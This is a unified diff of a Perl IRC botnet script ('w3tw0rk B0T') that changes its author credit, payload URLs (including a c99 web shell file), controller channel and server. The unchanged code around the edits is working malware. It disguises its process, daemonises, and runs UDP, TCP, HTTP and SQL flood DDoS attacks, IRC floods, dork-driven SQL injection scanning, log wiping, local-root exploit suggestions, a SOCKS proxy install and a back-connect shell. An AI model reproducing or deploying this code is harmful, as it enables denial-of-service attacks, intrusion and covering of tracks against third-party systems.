@@ -1,32 +1,6 @@
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-                               
-                             _-' "'-,    
-                         _-' | d$$b |  
-                      _-'    | $$$$ |    
-                   _-'       | Y$$P |  
-                _-'|         |      |
-             _-'  _*         |      |
-          _-' |_-"      __--''\    /
-       _-'         __--'     __*--'
-     -'       __-''    __--*__-"`
-    |    _--''   __--*"__-'`  
-    |_--"  .--=`"__-||"  
-    |      |  |\\   ||
-    | .dUU |  | \\ //
-    | UUUU | _|___//
-    | UUUU |  |  
-    | UUUU |  |         [Defence aka Item]
-    | UUUU |  |         [Twitter - @lntrusive]
-    | UUUU |  |         [Virtual God]
-    | UUUU |  |         [Drink and Drive, Smoke and Fly, Chimp Gang or Die]
-    | UUP' |  |
-    |   ___^-"`
- 
-▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
-
 #!/usr/bin/perl
 ####################################
-# Original Design By OaTn Modded By Defence
+# Original Design By Pitbul Modded By yudhie
 #-[w3tw0rk B0T Commands List]-
 #-----[Hacking Based]-----
 # !bot @multiscan <vuln> <dork>
@@ -76,20 +50,20 @@ use LWP::UserAgent;
 my $processo = 'usr/sbin/httpd';
 my $linas_max='10';
 my $sleep='5';
-my $cmd="http://h4ck3d.wsnw.net/mic22.txt";
-my $id="http://h4ck3d.wsnw.net/mic22.txt";
+my $cmd="http://chynthea.org/injector/c99.txt???";
+my $id="http://www.fileden.com/files/2009/12/5/2676962/ajimbu";
 ############################################
-my @adms=("DeRf-");
-my @canais=("#pbot");
+my @adms=("msf_user");
+my @canais=("#lol");
 #Put your channel here
-my @nickname = ("baby");
+my @nickname = ("batibot");
 my $nick = $nickname[rand scalar @nickname];
-#Nickname of bot
-my $ircname ='unix';
-chop (my $realname = 'unx');
-#IRC name and Realname
-$servidor='us.priv8.in' unless $servidor;
-my $porta='6667';
+#Nickname of bot 
+my $ircname =("telnet","putty","cgi-bin","bash","tmp","var","omset","dat","chynthe","bed");
+chop (my $realname = 'rooter');
+#IRC name and Realname 
+$servidor='127.0.0.1' unless $servidor;
+my $porta='6667'; 
 ############################################
 $SIG{'INT'} = 'IGNORE';
 $SIG{'HUP'} = 'IGNORE';
@@ -100,14 +74,14 @@ use IO::Socket;
 use Socket;
 use IO::Select;
 chdir("/");
- 
+
 #Connect
 $servidor="$ARGV[0]" if $ARGV[0];
 $0="$processo"."\0"x16;;
 my $pid=fork;
 exit if $pid;
 die "Masalah fork: $!" unless defined($pid);
- 
+
 our %irc_servers;
 our %DCC;
 my $dcc_sel = new IO::Select->new();
@@ -116,17 +90,17 @@ sub sendraw {
    if ($#_ == '1') {
       my $socket = $_[0];
       print $socket "$_[1]\n";
- 
+
    } else {
       print $IRC_cur_socket "$_[0]\n";
    }
 }
- 
+
 sub conectar {
    my $meunick = $_[0];
    my $servidor_con = $_[1];
    my $porta_con = $_[2];
- 
+
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
    PeerPort=>$porta_con) or return(1);
    if (defined($IRC_socket)) {
@@ -142,7 +116,7 @@ sub conectar {
       sleep 1;
    }
 }
- 
+
 my $line_temp;
 while( 1 ) {
    while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
@@ -173,7 +147,7 @@ while( 1 ) {
             } elsif ($lines[$c] =~ /\r$/) {
                parse("$line");
             } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
-               parse("$line");
+               parse("$line"); 
             } else {
                $line_temp = $line;
             }
@@ -181,7 +155,7 @@ while( 1 ) {
       }
    }
 }
- 
+
 sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
@@ -228,7 +202,7 @@ sub parse {
       }
    }
 }
- 
+
 sub bfunc {
    my $printl = $_[0];
    my $funcarg = $_[1];
@@ -238,7 +212,7 @@ sub bfunc {
       if (fork) {
          exit;
       } else {
- 
+
          if ($funcarg =~ /^killme/) {
             sendraw($IRC_cur_socket, "QUIT :");
             $killd = "kill -9 ".fork;
@@ -260,7 +234,7 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cleartmp");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3rootable");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3nmap <ip> <beginport> <endport>");
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");  
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");   
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cd tmp:. | for example");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] ");
@@ -269,11 +243,11 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3udpflood <host> <packet size> <time>");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tcpflood <host> <port> <packet size> <time>");
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>");
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>"); 
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sqlflood <host> <time>");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] ");
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3killme");  
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3join #channel");  
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3killme");   
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3join #channel");   
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3part #channel");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3reset");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3voice <who> ");
@@ -292,7 +266,7 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3channelflood");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3maxiflood <who> ");
 }
- 
+
          if ($funcarg =~ /^linuxhelp/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Linux Help]-----14@4] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@ 3Dir where you are : pwd");
@@ -315,7 +289,7 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3hacking - For Hacking Command Help");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp - For Linux Help");
          }
- 
+
          if ($funcarg =~ /^flooding/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3msgflood <who> ");
@@ -336,22 +310,22 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3dehalfop <who> ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3op <who> ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3deop <who> ");
-         }  
+         }   
          
          if ($funcarg =~ /^ddos/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Ddos Commands]-----14@12] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3udpflood <host> <packet size> <time>");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3tcpflood <host> <port> <packet size> <time>");
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>");
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3httpflood <host> <time>"); 
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3sqlflood <host> <time>");
-         }  
- 
+         }   
+
          if ($funcarg =~ /^news/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[News Commands]-----14@12] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3packetstorm");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3milw0rm");
-         }  
- 
+         }   
+
          if ($funcarg =~ /^hacking/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Hacking Commands]-----14@12] ");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3multiscan <vuln> <dork>");
@@ -363,7 +337,7 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cleartmp");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3rootable");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3nmap <ip> <beginport> <endport>");
-            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");  
+            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3back <ip><port>");   
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3linuxhelp");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :7!bot 14@3cd tmp:. | for example");
          }                  
@@ -390,7 +364,7 @@ sub bfunc {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Owner        : 7 fuck");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Channel      : 7 #berau");
          }
- 
+
          if ($funcarg =~ /^milw0rm/) {
             my @ltt=();
             my @bug=();
@@ -405,7 +379,7 @@ sub bfunc {
                $x = $1;
                if ($x =~ /\&lt\;/) {
                   $x =~ s/\&lt\;/</g;
-               }        
+               }         
                if ($x !~ /milw0rm/) {
                   push (@bug,$x);
                }
@@ -444,23 +418,23 @@ sub bfunc {
                sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] No open ports foundend.");
             }
          }
- 
+
 ######################
 #  End of  Portscan  #
 #####################
 #####################
 # Chk The News from PacketStorm#
 ######################
-if ($funcarg =~ /^packetstorm/) {
+if ($funcarg =~ /^packetstorm/) { 
    my $c=0;
    my $x;
    my @ttt=();
-   my @ttt1=();
-   my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return;
+   my @ttt1=(); 
+   my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return; 
    print $sock "GET /whatsnew20.xml HTTP/1.0\r\n";
    print $sock "Host: www.packetstormsecurity.org\r\n";
    print $sock "Accept: */*\r\n";
-   print $sock "User-Agent: Mozilla/5.0\r\n\r\n";
+   print $sock "User-Agent: Mozilla/5.0\r\n\r\n"; 
    my @r = <$sock>;
    $page="@r";
    close($sock);
@@ -469,7 +443,7 @@ if ($funcarg =~ /^packetstorm/) {
            push(@ttt,$1);
    }
    while ($page =~  m/<description>(.*)<\/description>/g)
-   {
+   { 
           push(@ttt1,$1);
    }
    foreach $x (0..(@ttt - 1))
@@ -497,7 +471,7 @@ if ($funcarg =~ /^socks5/) {
       system './mocks start';
          sleep(4);
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Looks like its succesfully installed lets do the last things4   ");
- 
+
       #lets grab ip
       $net = `/sbin/ifconfig | grep 'eth0'`;
       if (length($net))
@@ -514,7 +488,7 @@ if ($funcarg =~ /^socks5/) {
          $netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/;
          $ip = $1 .".". $2 .".". $3 .".". $4;
          
-            #and print it ^^  
+            #and print it ^^   
             sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] Connect here :4 ". $ip .":8787 ");
          }
       else
@@ -528,7 +502,7 @@ else
 }
 }
 ######################
-#        Nmap        #
+#        Nmap        # 
 ######################
    if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
          my $hostip="$1";
@@ -546,6 +520,7 @@ else
                  }
                }
              }
+
              if (@abertas) {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| Complete ");
              } else {
@@ -553,10 +528,10 @@ else
              }
           }
 ######################
-#    End of Nmap     #
+#    End of Nmap     # 
 ######################
 ######################
-#    Log Cleaner     #
+#    Log Cleaner     # 
 ######################
 if ($funcarg =~ /^logcleaner/) {
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  This process can be long, just wait");
@@ -585,12 +560,12 @@ sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleane
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Done! All logs erased");
       }
 ######################
-# End of Log Cleaner #
+# End of Log Cleaner # 
 ######################
 ######################
 #              SQL SCANNER              #
 ######################
- 
+
 if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
    if (my $pid = fork) {
       waitpid($pid, 0);
@@ -626,7 +601,7 @@ if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
                         my @altlist=&altavista($dork);
                         my @slist=&search($dork);
                         my @ulist=&uol($dork);
-                        my @fireball=&fireball($dork);  
+                        my @fireball=&fireball($dork);   
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 MSN 7[".scalar(@mlist)."7] Sites");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 AllTheWeb 7[".scalar(@allist)."7] Sites");
@@ -641,18 +616,18 @@ if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Search[dot]com 7[".scalar(@slist)."7] Sites");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 UoL 7[".scalar(@ulist)."7] Sites");
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 FireBall 7[".scalar(@flist)."7] Sites");
-           
+            
             push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );
-           
+            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Filtruje4 ][ ".scalar(@tot)." 12Stron4 ] ");
             my @puliti=&unici(@tot);
-           
+            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ SQL ] [ 12$dork4 ][ ".scalar(@puliti)." 12Stron4 ] ");
          
             my $uni=scalar(@puliti);
-                 
+                  
                   foreach my $sito (@puliti) {
-             
+              
                   $contatore++;
                     if ($contatore %5==0){
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Skanuje4 ][ ".$contatore." 12z4 ".$uni. " 12Stron4 ] ");
@@ -660,18 +635,18 @@ if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
                   sleep 3;
                     if ($contatore==$uni-1){
                      sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Koniec:4 $bug $dork ] ");
-                    }  
+                    }   
                   sleep 3;
                     my $site="http://".$sito.$bug;
                   sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] ");
          
-         $w=int rand(999);  
+         $w=int rand(999);   
          $w=$w*1000;
          for($i=1;$i<=$columns;$i++) {
             splice(@col,0,$#col+1);
             for($j=1;$j<=$i;$j++) {
                push(@col,$w+$j);
-            }  
+            }   
             $tmp=join(",",@col);
             $test=$site."-1+UNION+SELECT+".$tmp."/*";
             print $test."\n";
@@ -683,12 +658,12 @@ if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
                   if($result =~ /$n/){
                      splice(@col2,0,$#col2+1);
                         for($s=1;$s<=$i;$s++) {
-                           push(@col2,$s);
+                           push(@col2,$s); 
                         }
                      $tmp2=join(",",@col2);
                      $test2="+UNION+SELECT+".$tmp2."/*";
                      push @{$dane{$test2}},$k;
-                  }
+                  } 
             }
          }
          for $klucz (keys %dane) {
@@ -705,7 +680,7 @@ if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
    }
 }
 #######  SQL SCANNER  #########
- 
+
 if ($funcarg =~ /^autoscan\s+(.*)\s+http\:\/\/(.*?)\/(.*?)\s+(\d+)/){
 if (my $pid = fork) {
 waitpid($pid, 0);
@@ -718,47 +693,47 @@ exit;
       $host = $2;
       $skrypt = $3;
       $czekac=$4;
-     
+      
       #http://ttl.ugu.pl/string/index.php
       my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>"80",Proto=>"tcp") or return;
       print $socke "GET /$skrypt HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
-     
+      
       my @r = <$socke>;
       $page="@r";
    
       $page =~ s/!scan(\s+)//g;
       $page =~ s/!scan(.)//g;
       $page =~ s/\<.*\>//g;
-     
+      
       @lines = split (/\n/, $page);
       $ile=scalar(@lines);
-           
-     
+            
+      
       for($i=9;$i<=$ile;$i+=4) {
- 
+
          for($j=0;$j<4;$j++) {
             #print $lines[$i+$j]."\n";
-           
+            
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$kto $lines[$i+$j]");
-           
+            
             sleep 10;
          }
          
          sleep $czekac*60;
       }
- 
+
    }
       delproc($$);
       exit;
    }
 }
- 
- 
- 
- 
- 
+
+
+
+
+
 #######  SQL SCANNER  #########
- 
+
 if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
    if (my $pid = fork()) {
       waitpid($pid, 0);
@@ -771,13 +746,13 @@ if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
          my $columns=$2;
          sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] ");
          
-         $w=int rand(999);  
+         $w=int rand(999);   
          $w=$w*1000;
          for($i=1;$i<=$columns;$i++) {
             splice(@col,0,$#col+1);
             for($j=1;$j<=$i;$j++) {
                push(@col,$w+$j);
-            }  
+            }   
             $tmp=join(",",@col);
             $test=$site.$bug."-1+UNION+SELECT+".$tmp."/*";
                         #$result=query($test);
@@ -790,12 +765,12 @@ if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
                   if($result =~ /$n/){
                      splice(@col2,0,$#col2+1);
                         for($s=1;$s<=$i;$s++) {
-                           push(@col2,$s);
+                           push(@col2,$s); 
                         }
                      $tmp2=join(",",@col2);
                      $test2="+UNION+SELECT+".$tmp2."/*";
                      push @{$dane{$test2}},$k;
-                  }
+                  } 
             }
          }
          for $klucz (keys %dane) {
@@ -814,28 +789,28 @@ if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
 ######################
 #        Rootable                                     #
 ######################
-if ($funcarg =~ /^rootable/) {
+if ($funcarg =~ /^rootable/) { 
 my $khost = `uname -r`;
 my $currentid = `whoami`;
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Currently you are ".$currentid." ");
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] The kernel of this box is ".$khost." ");
 chomp($khost);
- 
+
    my %h;
-   $h{'w00t'} = {
-      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20']
+   $h{'w00t'} = { 
+      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] 
    };
    
    $h{'brk'} = {
-      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20']
+      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] 
    };
    
    $h{'ave'} = {
-      vuln=>['2.4.19','2.4.20']
+      vuln=>['2.4.19','2.4.20'] 
    };
    
    $h{'elflbl'} = {
-      vuln=>['2.4.29']
+      vuln=>['2.4.29'] 
    };
    
    $h{'elfdump'} = {
@@ -843,7 +818,7 @@ chomp($khost);
    };
    
    $h{'expand_stack'} = {
-      vuln=>['2.4.29']
+      vuln=>['2.4.29'] 
    };
    
    $h{'h00lyshit'} = {
@@ -851,7 +826,7 @@ chomp($khost);
    };
    
    $h{'kdump'} = {
-      vuln=>['2.6.13']
+      vuln=>['2.6.13'] 
    };
    
    $h{'km2'} = {
@@ -871,99 +846,99 @@ chomp($khost);
    };
    
    $h{'loko'} = {
-      vuln=>['2.4.22','2.4.23','2.4.24']
+      vuln=>['2.4.22','2.4.23','2.4.24'] 
    };
    
    $h{'mremap_pte'} = {
-      vuln=>['2.4.20','2.2.25','2.4.24']
+      vuln=>['2.4.20','2.2.25','2.4.24'] 
    };
    
    $h{'newlocal'} = {
-      vuln=>['2.4.17','2.4.19','2.4.18']
+      vuln=>['2.4.17','2.4.19','2.4.18'] 
    };
    
    $h{'ong_bak'} = {
-      vuln=>['2.4.','2.6.']
+      vuln=>['2.4.','2.6.'] 
    };
    
    $h{'ptrace'} = {
-      vuln=>['2.2.','2.4.22']
+      vuln=>['2.2.','2.4.22'] 
    };
    
    $h{'ptrace_kmod'} = {
-      vuln=>['2.4.2']
+      vuln=>['2.4.2'] 
    };
    
    $h{'ptrace24'} = {
-      vuln=>['2.4.9']
+      vuln=>['2.4.9'] 
    };
    
    $h{'pwned'} = {
-      vuln=>['2.4.','2.6.']
+      vuln=>['2.4.','2.6.'] 
    };
    
    $h{'py2'} = {
-      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13']
+      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] 
    };
    
    $h{'raptor_prctl'} = {
-      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13']
+      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] 
    };
    
    $h{'prctl3'} = {
-      vuln=>['2.6.13','2.6.17','2.6.9']
+      vuln=>['2.6.13','2.6.17','2.6.9'] 
    };
    
    $h{'remap'} = {
-      vuln=>['2.4.']
+      vuln=>['2.4.'] 
    };
    
    $h{'rip'} = {
-      vuln=>['2.2.']
+      vuln=>['2.2.'] 
    };
    
    $h{'stackgrow2'} = {
-      vuln=>['2.4.29','2.6.10']
+      vuln=>['2.4.29','2.6.10'] 
    };
    
    $h{'uselib24'} = {
-      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25']
+      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] 
    };
    
    $h{'newsmp'} = {
-      vuln=>['2.6.']
+      vuln=>['2.6.'] 
    };
    
    $h{'smpracer'} = {
-      vuln=>['2.4.29']
+      vuln=>['2.4.29'] 
    };
    
    $h{'loginx'} = {
-      vuln=>['2.4.22']
+      vuln=>['2.4.22'] 
    };
    
    $h{'exp.sh'} = {
-      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13']
+      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] 
    };
    
    $h{'prctl'} = {
-      vuln=>['2.6.']
+      vuln=>['2.6.'] 
    };
    
    $h{'kmdx'} = {
-      vuln=>['2.6.','2.4.']
+      vuln=>['2.6.','2.4.'] 
    };
    
    $h{'raptor'} = {
-      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
+      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
    };
    
    $h{'raptor2'} = {
-      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16']
+      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] 
    };
    
 foreach my $key(keys %h){
-foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
+foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ 
    if($khost=~/^$kernel/){
    chop($kernel) if ($kernel=~/.$/);
    sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Possible Local Root Exploits: ". $key ." ");
@@ -972,7 +947,7 @@ foreach my $kernel ( @{ $h{$key}{'vuln'} } ){
 }
 }
 ######################
-#       MAILER       #
+#       MAILER       # 
 ######################
 if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]  Mailer :. |  Sending Mail to : 2 $3");
@@ -992,16 +967,16 @@ close (SENDMAIL);
 sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Mailer12]   Mailer :. |  Mail Sent To : 2 $recipient");
 }
 ######################
-#   End of MAILER    #
+#   End of MAILER    # 
 ######################
 # A /tmp cleaner
-if ($funcarg =~ /^cleartmp/) {
+if ($funcarg =~ /^cleartmp/) { 
     system 'cd /tmp;rm -rf *';
          sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TMPCleaner12] /tmp is Cleaned");
          }
 #-#-#-#-#-#-#-#-#
 # Flooders IRC  #
-#-#-#-#-#-#-#-#-#        
+#-#-#-#-#-#-#-#-#         
 # msg, @msgflood <who>
 if ($funcarg =~ /^msgflood (.+?) (.*)/) {
    for($i=0; $i<=10; $i+=1){
@@ -1028,13 +1003,14 @@ if ($funcarg =~ /^ctcpflood (.*)/) {
 # noticeflood, @noticeflood <who>
    if ($funcarg =~ /^noticeflood (.*)/) {
       for($i=0; $i<=10; $i+=1){
+
          sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFL00D\n");
    }
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3NoticeFlood12]14 Excecuted on ".$1." ");
 }      
 # Channel Flood, @channelflood
 if ($funcarg =~ /^channelflood/) {
-   for($i=0; $i<=25; $i+=1){
+   for($i=0; $i<=25; $i+=1){ 
       sendraw($IRC_cur_socket, "JOIN #".(int(rand(99999))) );
    }
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3ChannelFlood12]14 Excecuted ");
@@ -1045,7 +1021,7 @@ if ($funcarg =~ /^maxiflood(.*)/) {
          sendraw($IRC_cur_socket, "NOTICE ".$1." :w3tFl00D\n");
          sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001VERSION\001\n");
          sendraw($IRC_cur_socket, "PRIVMSG ".$1." :\001PING\001\n");
-         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :w3tFl00D\n");        
+         sendraw($IRC_cur_socket, "PRIVMSG ".$1." :w3tFl00D\n");         
    }
       sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3M4Xi-Fl00d12]14 Excecuted on ".$1." ");
 }
@@ -1061,28 +1037,28 @@ if ($funcarg =~ /^maxiflood(.*)/) {
          if ($funcarg =~ /^part (.*)/) {
             sendraw($IRC_cur_socket, "PART ".$1);
          }
-         if ($funcarg =~ /^voice (.*)/) {
+         if ($funcarg =~ /^voice (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl +v ".$1);
            }
-         if ($funcarg =~ /^devoice (.*)/) {
+         if ($funcarg =~ /^devoice (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl -v ".$1);
            }
-         if ($funcarg =~ /^halfop (.*)/) {
+         if ($funcarg =~ /^halfop (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl +h ".$1);
            }
-         if ($funcarg =~ /^dehalfop (.*)/) {
+         if ($funcarg =~ /^dehalfop (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl -h ".$1);
            }
-         if ($funcarg =~ /^owner (.*)/) {
+         if ($funcarg =~ /^owner (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl +q ".$1);
            }
-         if ($funcarg =~ /^deowner (.*)/) {
+         if ($funcarg =~ /^deowner (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl -q ".$1);
          }
-         if ($funcarg =~ /^op (.*)/) {
+         if ($funcarg =~ /^op (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl +o ".$1);
-           }        
-         if ($funcarg =~ /^deop (.*)/) {
+           }         
+         if ($funcarg =~ /^deop (.*)/) { 
             sendraw($IRC_cur_socket, "MODE $printl -o ".$1);
            }
 ######################
@@ -1091,7 +1067,7 @@ if ($funcarg =~ /^maxiflood(.*)/) {
 ######################
 #     TCPFlood       #
 ######################
- 
+
          if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3TCP-DDOS12] Attacking 4 ".$1.":".$2." 12for 4 ".$3." 12seconds.");
             my $itime = time;
@@ -1124,7 +1100,7 @@ sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-DDOS12] Attacking don
 }
 ######################
 #   Back Connect     #
- 
+
 ######################
          if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
